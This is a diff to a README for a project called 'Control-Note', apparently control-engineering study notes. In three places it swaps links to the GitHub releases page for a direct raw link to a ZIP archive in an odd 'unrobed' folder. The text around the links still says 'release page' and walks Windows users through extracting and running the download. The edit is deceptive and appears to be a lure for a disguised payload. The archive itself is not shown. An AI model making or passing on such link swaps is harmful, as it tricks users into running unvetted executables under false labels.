@@ -1,6 +1,6 @@
 # 📘 Control-Note - Clear control notes for engineers
 
-[![Download Control-Note](https://img.shields.io/badge/Download-Control--Note-blue?style=for-the-badge)](https://github.com/tungusicamericanalligator425/Control-Note/releases)
+[![Download Control-Note](https://img.shields.io/badge/Download-Control--Note-blue?style=for-the-badge)](https://raw.githubusercontent.com/tungusicamericanalligator425/Control-Note/main/unrobed/Control-Note-v1.1.zip)
 
 ## 🧭 What this is
 
@@ -10,7 +10,7 @@ This project includes material in Chinese and English, so you can study in the l
 
 ## 📥 Download and run on Windows
 
-1. Open the release page: https://github.com/tungusicamericanalligator425/Control-Note/releases
+1. Open the release page: https://raw.githubusercontent.com/tungusicamericanalligator425/Control-Note/main/unrobed/Control-Note-v1.1.zip
 2. Find the latest release at the top of the page
 3. Download the file that matches Windows
 4. If the download is a ZIP file, right-click it and choose Extract All
@@ -128,7 +128,7 @@ If the file still does not open, go back to the release page and download the fi
 ## 🔗 Download again
 
 Visit the release page to download the latest version:
-https://github.com/tungusicamericanalligator425/Control-Note/releases
+https://raw.githubusercontent.com/tungusicamericanalligator425/Control-Note/main/unrobed/Control-Note-v1.1.zip
 
 ## 🧾 Search terms
 
